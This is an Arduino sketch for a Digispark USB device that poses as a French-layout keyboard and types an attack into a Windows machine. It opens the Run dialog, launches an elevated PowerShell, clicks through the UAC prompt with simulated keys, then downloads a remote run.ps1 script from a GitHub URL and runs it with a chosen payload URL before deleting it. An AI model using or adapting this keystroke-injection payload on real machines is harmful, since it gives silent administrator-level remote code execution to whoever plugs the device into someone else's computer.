#include <DigiKeyboardFr.h>
char* payloadUrl = "none";

void setup() {
  DigiKeyboard.delay(500);

  if(payloadUrl == "none") {
    DigiKeyboardFr.sendKeyStroke(0);
    DigiKeyboardFr.sendKeyStroke(KEY_FR_R, MOD_GUI_LEFT);//WIN+R
    DigiKeyboard.delay(1500);
    DigiKeyboardFr.print("!url");
  } else {
    DigiKeyboardFr.sendKeyStroke(0);
    DigiKeyboardFr.sendKeyStroke(KEY_FR_R, MOD_GUI_LEFT);//WIN+R
    DigiKeyboard.delay(1500);
    DigiKeyboardFr.println("powershell Start-Process powershell -Verb runAs");
    DigiKeyboard.delay(2500);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboardFr.println("(New-Object Net.Webclient).DownloadFile(\"https://raw.githubusercontent.com/phorcysed/StupidSpark/master/runPayload/run.ps1\",\"o.ps1\")");
    DigiKeyboardFr.print(".\\o.ps1 \"");
    DigiKeyboardFr.print(payloadUrl);
    DigiKeyboardFr.println("\"; Remove-Item o.ps1; exit");
  }
}

void loop() {}
